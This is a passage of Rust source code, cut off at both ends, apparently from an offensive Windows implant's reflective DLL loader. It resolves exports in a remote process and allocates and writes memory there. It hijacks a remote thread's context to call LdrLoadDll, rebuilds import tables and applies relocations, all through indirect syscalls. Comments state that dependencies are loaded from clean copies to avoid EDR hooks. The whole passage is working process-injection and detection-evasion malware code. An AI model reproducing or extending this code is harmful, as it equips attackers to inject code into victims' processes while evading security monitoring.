                    process_handle,
                    remote_dll_base,
                    fn_rva,
                    export_rva + export_size,
                    256,
                    "resolve_remote_export forwarder",
                )?;
                return resolve_remote_forwarder_export(process_handle, &forwarder);
            }
            return Ok(remote_dll_base + fn_rva);
        }
    }

    bail!(
        "resolve_remote_export: '{}' not found in DLL at {:#x}",
        fn_name,
        remote_dll_base
    )
}

unsafe fn resolve_remote_export_by_ordinal(
    process_handle: HANDLE,
    remote_dll_base: usize,
    ordinal: u16,
) -> Result<usize> {
    let dos = nt_read_remote_exact(
        process_handle,
        remote_dll_base,
        64,
        "resolve_remote_export_by_ordinal",
    )?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        bail!(
            "resolve_remote_export_by_ordinal: bad DOS magic at {:#x}: {:#x}",
            remote_dll_base,
            e_magic
        );
    }
    let e_lfanew = i32::from_le_bytes(dos[60..64].try_into().unwrap());
    if e_lfanew < 0 {
        bail!(
            "resolve_remote_export_by_ordinal: negative e_lfanew at {:#x}",
            remote_dll_base
        );
    }

    let nt = nt_read_remote_exact(
        process_handle,
        remote_dll_base + e_lfanew as usize,
        144,
        "resolve_remote_export_by_ordinal",
    )?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        bail!(
            "resolve_remote_export_by_ordinal: bad PE signature at {:#x}",
            remote_dll_base
        );
    }
    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x020B {
        bail!(
            "resolve_remote_export_by_ordinal: unsupported optional-header magic {:#x} at {:#x}",
            opt_magic,
            remote_dll_base
        );
    }

    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        bail!(
            "resolve_remote_export_by_ordinal: DLL at {:#x} has no export directory",
            remote_dll_base
        );
    }

    let exp = nt_read_remote_exact(
        process_handle,
        remote_dll_base + export_rva,
        export_size,
        "resolve_remote_export_by_ordinal",
    )?;
    let ordinal_base = u32::from_le_bytes(exp[16..20].try_into().unwrap());
    let function_count = u32::from_le_bytes(exp[20..24].try_into().unwrap());
    let function_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;

    let ordinal_u32 = ordinal as u32;
    if ordinal_u32 < ordinal_base {
        bail!(
            "resolve_remote_export_by_ordinal: ordinal {} is below export base {} at {:#x}",
            ordinal,
            ordinal_base,
            remote_dll_base
        );
    }
    let index = (ordinal_u32 - ordinal_base) as usize;
    if index >= function_count as usize {
        bail!(
            "resolve_remote_export_by_ordinal: ordinal {} index {} exceeds function count {} at {:#x}",
            ordinal,
            index,
            function_count,
            remote_dll_base
        );
    }

    let fn_rva_bytes = nt_read_remote_exact(
        process_handle,
        remote_dll_base + function_table_rva + index * 4,
        4,
        "resolve_remote_export_by_ordinal",
    )?;
    let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
    if fn_rva >= export_rva && fn_rva < export_rva + export_size {
        let forwarder = read_remote_c_string_from_image(
            process_handle,
            remote_dll_base,
            fn_rva,
            export_rva + export_size,
            256,
            "resolve_remote_export_by_ordinal forwarder",
        )?;
        return resolve_remote_forwarder_export(process_handle, &forwarder);
    }

    Ok(remote_dll_base + fn_rva)
}

unsafe fn resolve_remote_forwarder_export(
    process_handle: HANDLE,
    forwarder: &str,
) -> Result<usize> {
    thread_local! {
        static REMOTE_FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }

    let depth = REMOTE_FORWARDER_DEPTH.with(|cell| cell.get());
    if depth >= MAX_REMOTE_FORWARDER_DEPTH {
        bail!(
            "resolve_remote_forwarder_export: forwarder chain too deep at {}",
            forwarder
        );
    }

    struct ForwarderDepthGuard;
    impl Drop for ForwarderDepthGuard {
        fn drop(&mut self) {
            REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(cell.get().saturating_sub(1)));
        }
    }

    REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(depth + 1));
    let _guard = ForwarderDepthGuard;

    let (module_part, symbol_part) = forwarder.rsplit_once('.').ok_or_else(|| {
        anyhow!(
            "resolve_remote_forwarder_export: malformed forwarder string '{}'",
            forwarder
        )
    })?;
    let module_name = normalize_import_dll_name(module_part);
    let mut remote_modules = build_remote_module_map(process_handle)?;
    let ldr_load_dll_addr = resolve_remote_ldr_load_dll(process_handle, &remote_modules)?;
    let remote_module_base = ensure_remote_module_loaded_cached(
        process_handle,
        &module_name,
        ldr_load_dll_addr,
        &mut remote_modules,
    )?;

    if let Some(ordinal_text) = symbol_part.strip_prefix('#') {
        let ordinal = ordinal_text.parse::<u16>().map_err(|e| {
            anyhow!(
                "resolve_remote_forwarder_export: invalid ordinal forwarder '{}': {}",
                forwarder,
                e
            )
        })?;
        resolve_remote_export_by_ordinal(process_handle, remote_module_base, ordinal)
    } else {
        resolve_remote_export(process_handle, remote_module_base, symbol_part)
    }
}

unsafe fn resolve_remote_ldr_load_dll(
    process_handle: HANDLE,
    remote_modules: &HashMap<String, usize>,
) -> Result<usize> {
    let remote_ntdll = remote_modules
        .get("ntdll.dll")
        .copied()
        .or_else(|| get_remote_ntdll_base(process_handle))
        .ok_or_else(|| anyhow!("reflective_loader: unable to locate remote ntdll.dll"))?;
    resolve_remote_export(process_handle, remote_ntdll, "LdrLoadDll")
}

unsafe fn ensure_remote_module_loaded_cached(
    process_handle: HANDLE,
    dll_name: &str,
    ldr_load_dll_addr: usize,
    remote_modules: &mut HashMap<String, usize>,
) -> Result<usize> {
    let key = normalize_import_dll_name(dll_name);
    if let Some(&base) = remote_modules.get(&key) {
        return Ok(base);
    }

    let base = ensure_remote_module_loaded(process_handle, &key, ldr_load_dll_addr)?;
    remote_modules.insert(key, base);
    Ok(base)
}

unsafe fn ensure_remote_module_loaded(
    process_handle: HANDLE,
    dll_name: &str,
    ldr_load_dll_addr: usize,
) -> Result<usize> {
    let wide_name: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_bytes = wide_name.len() * 2;
    let us_offset = wide_bytes;
    let base_addr_offset = us_offset + std::mem::size_of::<UNICODE_STRING>();
    let total_remote = base_addr_offset + std::mem::size_of::<usize>();

    let mut remote_block: *mut c_void = std::ptr::null_mut();
    let mut remote_block_size = total_remote;
    let alloc_status = resolve_syscall("NtAllocateVirtualMemory")?;
    let alloc_ret = do_syscall(
        alloc_status.ssn,
        alloc_status.gadget_addr,
        &[
            process_handle as u64,
            &mut remote_block as *mut _ as u64,
            0,
            &mut remote_block_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        ],
    );
    if alloc_ret != 0 || remote_block.is_null() {
        bail!(
            "reflective_loader: failed to allocate remote LdrLoadDll staging block for {}",
            dll_name
        );
    }

    let cleanup_block = |block: *mut c_void| {
        if let Ok(sys) = resolve_syscall("NtFreeVirtualMemory") {
            let mut free_base = block;
            let mut free_size: usize = 0;
            let _ = do_syscall(
                sys.ssn,
                sys.gadget_addr,
                &[
                    process_handle as u64,
                    &mut free_base as *mut _ as u64,
                    &mut free_size as *mut _ as u64,
                    MEM_RELEASE as u64,
                ],
            );
        }
    };

    nt_write_virtual_memory(
        process_handle,
        remote_block,
        std::slice::from_raw_parts(wide_name.as_ptr() as *const u8, wide_bytes),
    )
    .map_err(|e| {
        cleanup_block(remote_block);
        anyhow!(
            "reflective_loader: failed to write remote DLL name for LdrLoadDll ({}): {}",
            dll_name,
            e
        )
    })?;

    let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
    let remote_base_out = (remote_block as usize + base_addr_offset) as *mut c_void;
    let mut remote_us = UNICODE_STRING {
        Length: (wide_bytes.saturating_sub(2)) as u16,
        MaximumLength: wide_bytes as u16,
        Buffer: remote_block as *mut u16,
    };

    nt_write_virtual_memory(
        process_handle,
        remote_us_ptr,
        std::slice::from_raw_parts(
            &mut remote_us as *mut _ as *const u8,
            std::mem::size_of::<UNICODE_STRING>(),
        ),
    )
    .map_err(|e| {
        cleanup_block(remote_block);
        anyhow!(
            "reflective_loader: failed to write remote UNICODE_STRING for LdrLoadDll ({}): {}",
            dll_name,
            e
        )
    })?;

    let zero_base: usize = 0;
    nt_write_virtual_memory(
        process_handle,
        remote_base_out,
        std::slice::from_raw_parts(
            &zero_base as *const _ as *const u8,
            std::mem::size_of::<usize>(),
        ),
    )
    .map_err(|e| {
        cleanup_block(remote_block);
        anyhow!(
            "reflective_loader: failed to initialize remote LdrLoadDll output slot for {}: {}",
            dll_name,
            e
        )
    })?;

    let create_thread = resolve_syscall("NtCreateThreadEx")?;
    let mut h_thread: HANDLE = std::ptr::null_mut();
    let create_status = do_syscall(
        create_thread.ssn,
        create_thread.gadget_addr,
        &[
            &mut h_thread as *mut _ as u64,
            0x1A02,
            0,
            process_handle as u64,
            ldr_load_dll_addr as u64,
            remote_us_ptr as u64,
            0x1,
            0,
            0,
            0,
            0,
        ],
    );
    if create_status != 0 || h_thread.is_null() {
        cleanup_block(remote_block);
        bail!(
            "reflective_loader: NtCreateThreadEx for remote LdrLoadDll({}) failed: {:#010x}",
            dll_name,
            create_status as u32
        );
    }

    let mut args_configured = false;

    let get_ctx = resolve_syscall("NtGetContextThread")?;
    let set_ctx = resolve_syscall("NtSetContextThread")?;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;
    let get_ctx_status = do_syscall(
        get_ctx.ssn,
        get_ctx.gadget_addr,
        &[h_thread as u64, &mut ctx as *mut _ as u64],
    );
    if get_ctx_status == 0 {
        ctx.Rcx = 0;
        ctx.Rdx = 0;
        ctx.R8 = remote_us_ptr as u64;
        ctx.R9 = remote_base_out as u64;
        let set_ctx_status = do_syscall(
            set_ctx.ssn,
            set_ctx.gadget_addr,
            &[h_thread as u64, &ctx as *const _ as u64],
        );
        args_configured = set_ctx_status == 0;
    }

    if !args_configured {
        if let Ok(term_thread) = resolve_syscall("NtTerminateThread") {
            let _ = do_syscall(
                term_thread.ssn,
                term_thread.gadget_addr,
                &[h_thread as u64, 0],
            );
        }
        close_nt_handle(h_thread);
        cleanup_block(remote_block);
        bail!(
            "reflective_loader: failed to configure remote LdrLoadDll arguments for {}",
            dll_name
        );
    }

    let resume = resolve_syscall("NtResumeThread")?;
    let wait = resolve_syscall("NtWaitForSingleObject")?;
    let _ = do_syscall(resume.ssn, resume.gadget_addr, &[h_thread as u64, 0]);
    let _ = do_syscall(wait.ssn, wait.gadget_addr, &[h_thread as u64, 0, 0]);

    let mut loaded_remote_base: usize = 0;
    let mut base_buf = std::slice::from_raw_parts_mut(
        &mut loaded_remote_base as *mut _ as *mut u8,
        std::mem::size_of::<usize>(),
    );
    let read_res = nt_read_virtual_memory(
        process_handle,
        remote_base_out as *const c_void,
        &mut base_buf,
    );

    close_nt_handle(h_thread);
    cleanup_block(remote_block);

    if read_res.is_err() || loaded_remote_base == 0 {
        bail!(
            "reflective_loader: remote LdrLoadDll did not return a module base for {}",
            dll_name
        );
    }

    Ok(loaded_remote_base)
}

unsafe fn apply_relocations_for_remote_shared(
    local_base: usize,
    remote_base: usize,
    pe: &PeInfo,
) -> Result<()> {
    let (reloc_rva, reloc_size) = match pe.reloc_dir {
        Some(r) => r,
        None => return Ok(()),
    };

    let delta = remote_base as i64 - pe.image_base as i64;
    if delta == 0 {
        return Ok(());
    }

    let mut offset = 0usize;
    let mut count = 0usize;

    while offset + 8 <= reloc_size as usize && count < MAX_RELOCATIONS {
        let block_base = local_base + reloc_rva as usize + offset;

        let virtual_address = *(block_base as *const u32);
        let size_of_block = *((block_base + 4) as *const u32);

        if size_of_block == 0 || virtual_address == 0 {
            break;
        }

        let num_entries = ((size_of_block as usize - 8) / 2).min(MAX_RELOCATIONS);
        let entries_ptr = (block_base + 8) as *const u16;

        for i in 0..num_entries {
            let entry = *entries_ptr.add(i);
            let reloc_type = ((entry >> 12) & 0xF) as u32;
            let reloc_offset = (entry & 0xFFF) as usize;
            let target_addr = local_base + virtual_address as usize + reloc_offset;

            match reloc_type {
                IMAGE_REL_BASED_ABSOLUTE => {}
                IMAGE_REL_BASED_HIGH => {
                    if target_addr + 2 <= local_base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) = val.wrapping_add((delta >> 16) as u16);
                    }
                }
                IMAGE_REL_BASED_LOW => {
                    if target_addr + 2 <= local_base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) = val.wrapping_add(delta as u16);
                    }
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    if target_addr + 4 <= local_base + pe.size_of_image {
                        let val = *(target_addr as *const u32);
                        *(target_addr as *mut u32) = val.wrapping_add(delta as u32);
                    }
                }
                IMAGE_REL_BASED_HIGHADJ => {
                    if i + 1 < num_entries {
                        let cookie = *entries_ptr.add(i + 1) as i16;
                        if target_addr + 2 <= local_base + pe.size_of_image {
                            let val = *(target_addr as *const u16) as i32;
                            let adjusted = val + (delta >> 16) as i32 + cookie as i32;
                            *(target_addr as *mut u16) = adjusted as u16;
                        }
                        count += 1;
                    }
                }
                IMAGE_REL_BASED_DIR64 => {
                    if target_addr + 8 <= local_base + pe.size_of_image {
                        let val = *(target_addr as *const u64);
                        *(target_addr as *mut u64) = val.wrapping_add(delta as u64);
                    }
                }
                _ => {
                    tracing::debug!(
                        "Skipping unknown relocation type {} at RVA {:#x}",
                        reloc_type,
                        virtual_address as usize + reloc_offset,
                    );
                }
            }
            count += 1;
        }

        offset += size_of_block as usize;
    }

    Ok(())
}

unsafe fn rebuild_iat_reflective_remote(
    process_handle: HANDLE,
    local_base: usize,
    remote_base: usize,
    pe: &PeInfo,
) -> Result<()> {
    let (import_rva, _import_size) = match pe.import_dir {
        Some(r) => r,
        None => return Ok(()),
    };

    let mut remote_modules = build_remote_module_map(process_handle)?;
    let ldr_load_dll_addr = resolve_remote_ldr_load_dll(process_handle, &remote_modules)?;

    let mut import_desc = (local_base + import_rva as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (local_base + (*import_desc).Name as usize) as *const i8;
        let dll_name = match std::ffi::CStr::from_ptr(dll_name_ptr).to_str() {
            Ok(s) => s,
            Err(_) => {
                import_desc = import_desc.add(1);
                continue;
            }
        };
        let dll_name_norm = normalize_import_dll_name(dll_name);

        let remote_dll_base = ensure_remote_module_loaded_cached(
            process_handle,
            &dll_name_norm,
            ldr_load_dll_addr,
            &mut remote_modules,
        )?;

        let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
            (*import_desc).Anonymous.OriginalFirstThunk
        } else {
            (*import_desc).FirstThunk
        };

        match pe.magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                let mut original_thunk = (local_base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                let mut first_thunk = (local_base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
                    } else {
                        let ibn = (local_base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let name = name_cstr.to_str().unwrap_or("");
                        resolve_remote_export(process_handle, remote_dll_base, name)?
                    };

                    let proc_addr32 = u32::try_from(proc_addr).map_err(|_| {
                        anyhow!(
                            "reflective_loader: resolved address {:#x} exceeds 32-bit range for {}",
                            proc_addr,
                            dll_name_norm
                        )
                    })?;
                    let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
                    *mut_u1 = proc_addr32;

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let mut original_thunk = (local_base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
                let mut first_thunk = (local_base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
                    } else {
                        let ibn = (local_base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let name = name_cstr.to_str().unwrap_or("");
                        resolve_remote_export(process_handle, remote_dll_base, name)?
                    };

                    let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                    *mut_u1 = proc_addr as u64;

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            _ => {
                bail!(
                    "reflective_loader: unsupported optional-header magic {:#x} while rebuilding remote IAT",
                    pe.magic
                );
            }
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

// ── PE Loading Phases ───────────────────────────────────────────────────────

/// Copy PE headers and sections from raw bytes to the mapped memory.
unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result<()> {
    let base_ptr = base as *mut u8;

    // Copy PE headers (first e_lfanew + sizeof(NT headers) + section headers)
    let headers_size = pe.nt_header_offset
        + 4 // PE sig
        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
        + pe.size_of_optional_header as usize
        + pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
    let headers_size = align_up(headers_size, PAGE_SIZE).min(dll_bytes.len());

    std::ptr::copy_nonoverlapping(dll_bytes.as_ptr(), base_ptr, headers_size);

    // Copy each section from its file offset to its virtual address
    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let virtual_size = section.Misc.VirtualSize as usize;
        let raw_size = section.SizeOfRawData as usize;
        let virtual_address = section.VirtualAddress as usize;
        let raw_offset = section.PointerToRawData as usize;

        if virtual_size == 0 && raw_size == 0 {
            continue;
        }

        let dest = base_ptr.add(virtual_address);

        // Zero the virtual range first (in case VirtualSize > SizeOfRawData)
        let copy_size = raw_size.min(virtual_size);
        std::ptr::write_bytes(dest, 0u8, virtual_size);

        if copy_size > 0 && raw_offset + copy_size <= dll_bytes.len() {
            std::ptr::copy_nonoverlapping(dll_bytes.as_ptr().add(raw_offset), dest, copy_size);
        }
    }

    Ok(())
}

/// Apply delta-based relocations to the loaded image.
///
/// Handles the full `IMAGE_REL_BASED_*` enum:
/// - `DIR64` (64-bit): add delta to the 8-byte value
/// - `HIGHLOW` (32-bit): add delta low 32 bits to the 4-byte value
/// - `HIGH` (16-bit): add delta high 16 bits to the 2-byte value
/// - `LOW` (16-bit): add delta low 16 bits to the 2-byte value
/// - `HIGHADJ` (32-bit): adjust high 16 bits with a signed cookie
/// - `ABSOLUTE`: skip (padding)
unsafe fn apply_relocations(base: usize, pe: &PeInfo, dll_bytes: &[u8]) -> Result<()> {
    let (reloc_rva, reloc_size) = match pe.reloc_dir {
        Some(r) => r,
        None => return Ok(()), // No relocations needed
    };

    let delta = base as i64 - pe.image_base as i64;
    if delta == 0 {
        return Ok(()); // Loaded at preferred base, no fixups needed
    }

    // Walk the relocation blocks from the *loaded* image (not from dll_bytes)
    // because the image has been fully copied to its virtual addresses.
    let mut offset = 0usize;
    let mut count = 0usize;

    while offset + 8 <= reloc_size as usize && count < MAX_RELOCATIONS {
        let block_base = base + reloc_rva as usize + offset;

        // Read block header from loaded image
        let virtual_address = *(block_base as *const u32);
        let size_of_block = *((block_base + 4) as *const u32);

        if size_of_block == 0 || virtual_address == 0 {
            break;
        }

        // Number of entries = (SizeOfBlock - 8) / 2
        let num_entries = ((size_of_block as usize - 8) / 2).min(MAX_RELOCATIONS);
        let entries_ptr = (block_base + 8) as *const u16;

        for i in 0..num_entries {
            let entry = *entries_ptr.add(i);
            let reloc_type = ((entry >> 12) & 0xF) as u32;
            let reloc_offset = (entry & 0xFFF) as usize;
            let target_addr = base + virtual_address as usize + reloc_offset;

            match reloc_type {
                IMAGE_REL_BASED_ABSOLUTE => {
                    // Padding, skip
                }
                IMAGE_REL_BASED_HIGH => {
                    // Add high 16 bits of delta to 16-bit value
                    if target_addr + 2 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) = val.wrapping_add((delta >> 16) as u16);
                    }
                }
                IMAGE_REL_BASED_LOW => {
                    // Add low 16 bits of delta to 16-bit value
                    if target_addr + 2 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) = val.wrapping_add(delta as u16);
                    }
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    // Add full 32-bit delta to 32-bit value
                    if target_addr + 4 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u32);
                        *(target_addr as *mut u32) = val.wrapping_add(delta as u32);
                    }
                }
                IMAGE_REL_BASED_HIGHADJ => {
                    // High adjustment: (val + delta_high) + signed_cookie
                    // The next entry is the signed cookie
                    if i + 1 < num_entries {
                        let cookie = *entries_ptr.add(i + 1) as i16;
                        if target_addr + 2 <= base + pe.size_of_image {
                            let val = *(target_addr as *const u16) as i32;
                            let adjusted = val + (delta >> 16) as i32 + cookie as i32;
                            *(target_addr as *mut u16) = adjusted as u16;
                        }
                        // Skip the cookie entry
                        count += 1;
                    }
                }
                IMAGE_REL_BASED_DIR64 => {
                    // Add full 64-bit delta to 8-byte value
                    if target_addr + 8 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u64);
                        *(target_addr as *mut u64) = val.wrapping_add(delta as u64);
                    }
                }
                _ => {
                    // Unknown relocation type — skip (may be platform-specific)
                    tracing::debug!(
                        "Skipping unknown relocation type {} at RVA {:#x}",
                        reloc_type,
                        virtual_address as usize + reloc_offset,
                    );
                }
            }
            count += 1;
        }

        offset += size_of_block as usize;
    }

    Ok(())
}

/// Rebuild the Import Address Table for the loaded image.
///
/// Walks the import directory, loads each dependency DLL via `map_clean_dll`
/// (clean copies, no IAT hooks), and resolves each imported function by hash.
/// Handles forwarded exports through the pe_resolve infrastructure.
unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
    let (import_rva, _import_size) = match pe.import_dir {
        Some(r) => r,
        None => return Ok(()), // No imports
    };

    let mut import_desc = (base + import_rva as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
        let dll_name = match std::ffi::CStr::from_ptr(dll_name_ptr).to_str() {
            Ok(s) => s,
            Err(_) => {
                import_desc = import_desc.add(1);
                continue;
            }
        };

        // Load the dependency via clean mapping (no EDR hooks)
        let dep_base = match map_clean_dll(dll_name) {
            Ok(b) => b,
            Err(e) => {
                tracing::warn!(
                    "reflective_loader: failed to map clean {}: {}, skipping import",
                    dll_name,
                    e
                );
                import_desc = import_desc.add(1);
                continue;
            }
        };

        let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
            (*import_desc).Anonymous.OriginalFirstThunk
        } else {
            (*import_desc).FirstThunk
        };

        match pe.magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u32;
                        resolve_export_by_ordinal(dep_base, ordinal)
                    } else {
                        let ibn = (base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
                        pe_resolve::get_proc_address_by_hash(dep_base, hash).unwrap_or(0)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
                        *mut_u1 = proc_addr as u32;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u32;
                        resolve_export_by_ordinal(dep_base, ordinal)
                    } else {
                        let ibn = (base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
                        pe_resolve::get_proc_address_by_hash(dep_base, hash).unwrap_or(0)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                        *mut_u1 = proc_addr as u64;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            _ => {}
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

/// Resolve an export by ordinal from a clean-mapped DLL.
unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
    // Walk the export directory manually
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return 0;
    }
    let nt_off = (*dos).e_lfanew as usize;
    let opt_off = nt_off
        + 4
        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>();
    let magic = *(opt_off as *const u16);

    let export_dir_rva = match magic {
        IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt32 = (base + nt_off) as *const IMAGE_NT_HEADERS32;
            let dd = &(*nt32).OptionalHeader.DataDirectory;
            dd[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress
        }
        IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt64 = (base + nt_off) as *const IMAGE_NT_HEADERS64;
            let dd = &(*nt64).OptionalHeader.DataDirectory;
            dd[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress
        }
        _ => return 0,
    };
    if export_dir_rva == 0 {
        return 0;
    }

    let export_dir = (base + export_dir_rva as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
    let base_ordinal = (*export_dir).Base;
    let num_funcs = (*export_dir).NumberOfFunctions;
    let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;

    if ordinal < base_ordinal {
        return 0;
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return 0;
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return 0;
    }
    base + func_rva
}

/// Apply per-section memory protections.
///
/// Sets appropriate protections based on section characteristics:
/// - `.text` (executable) → PAGE_EXECUTE_READ
/// - `.rdata` (read-only data) → PAGE_READONLY
/// - `.data` (read-write data) → PAGE_READWRITE
/// - Headers → PAGE_READONLY
unsafe fn apply_section_protections(base: usize, pe: &PeInfo, dll_bytes: &[u8]) -> Result<()> {
    // Protect headers as read-only first
    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let characteristics = section.Characteristics;
        let virtual_size = section.Misc.VirtualSize as usize;
        let virtual_address = section.VirtualAddress as usize;

        if virtual_size == 0 {
            continue;
        }

        let section_base = (base + virtual_address) as *mut c_void;
        let section_size = align_up(virtual_size, PAGE_SIZE);

        let protect = if characteristics
            & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE
            != 0
            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE
                != 0
        {
            PAGE_EXECUTE_READWRITE
